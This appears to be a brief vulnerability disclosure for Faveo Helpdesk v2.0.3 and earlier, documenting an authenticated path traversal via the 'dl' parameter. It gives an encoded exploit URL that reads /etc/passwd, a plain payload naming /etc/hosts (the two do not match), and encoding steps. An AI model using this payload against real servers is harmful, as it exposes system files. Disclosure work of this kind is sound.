Vulnerability: File Traversal via dl

URL: ```https://192.168.124.130/logs?dl=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA%3d%3d```

Payload: ```../../../../../../../../../../../../../../../../etc/hosts```

Action to trigger: None

Note: The payload needs to be base64 encoded and then URL encoded

Version: ‎Version v2.0.3 and prior

Authenticated: Yes

User: Admin

Vulnerable Parameter: dl


https://github.com/ladybirdweb/faveo-helpdesk

![](https://github.com/4rdr/proofs/blob/main/gifs/faveo-helpdesk_2.0.3_File_Traversal_via_dl.gif)
